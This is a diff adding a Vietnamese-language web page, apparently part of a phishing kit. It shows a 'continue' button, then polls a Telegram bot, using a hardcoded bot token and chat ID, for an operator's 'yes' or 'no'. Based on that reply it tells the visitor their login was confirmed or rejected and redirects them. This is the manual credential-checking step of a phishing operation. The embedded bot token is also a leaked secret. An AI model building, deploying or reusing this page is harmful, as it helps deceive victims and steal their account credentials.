@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="style.css">
+    <title>H2Kinformation technology</title>
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@10"></script>
+</head>
+<body>
+
+    <div style="text-align: center; padding: 50px;">
+        <h2>Welcome to DEMO BY H2Kinformation technology</h2>
+        <p>Đây là bản demo vui lòng không gửi cho các bên chưa được cấp phép.</p>
+        <p>Protected by H2Kinformation technology</p>
+        <p> vui lòng nhấp vào "Tiếp Tục" để tiếp tục sử dụng website</p>
+        
+        <!-- Add a button to trigger the checkTelegramMessage function -->
+        <button onclick="checkTelegramMessage()">Tiếp tục</button>
+    </div>
+
+    <script>
+        function checkTelegramMessage() {
+            // Replace 'YOUR_BOT_TOKEN' and 'YOUR_CHAT_ID' with your actual bot token and chat ID
+            const botToken = '6888638596:AAFgaO74qbQF5idgb4OtEdm9hMB32r8MMQI';
+            const chatId = '6520036650';
+        
+            fetch(`https://api.telegram.org/bot${botToken}/getUpdates`)
+                .then(response => response.json())
+                .then(data => {
+                    const latestMessage = data.result[data.result.length - 1].message.text;
+        
+                    // Check if the latest message is "yes" or "no"
+                    if (latestMessage.toLowerCase() === 'yes') {
+                        // Show a success message
+                        Swal.fire({
+                            icon: 'success',
+                            title: 'Đăng nhập thành công!',
+                            text: 'Thông tin của bạn đã được xác nhận.',
+                        }).then((result) => {
+                            // Chuyển hướng sau khi người dùng tắt thông báo
+                            if (result.isConfirmed || result.isDismissed) {
+                                window.location.href = 'html3.html';
+                            }
+                        });
+                    } else if (latestMessage.toLowerCase() === 'no') {
+                        // Show an error message
+                        Swal.fire({
+                            icon: 'error',
+                            title: 'Sai thông tin đăng nhập!',
+                            text: 'Vui lòng kiểm tra lại thông tin và thử lại.',
+                        }).then((result) => {
+                            // Chuyển hướng sau khi người dùng tắt thông báo
+                            if (result.isConfirmed || result.isDismissed) {
+                                window.location.href = 'index.html';
+                            }
+                        });
+                    } else {
+                        // Handle other cases if needed
+                        Swal.fire({
+                            icon: 'error',
+                            title: 'Lỗi!',
+                            text: 'Không thể xác định Vui lòng chờ 5-10s và thử lại.',
+                        });
+                    }
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                    // Show an error message if there is an issue with the request
+                    Swal.fire({
+                        icon: 'error',
+                        title: 'Lỗi!',
+                        text: 'Không thể kiểm tra tin nhắn từ Telegram.',
+                    });
+                });
+        }
+        
+        
+    </script>
+
+</body>
+</html>
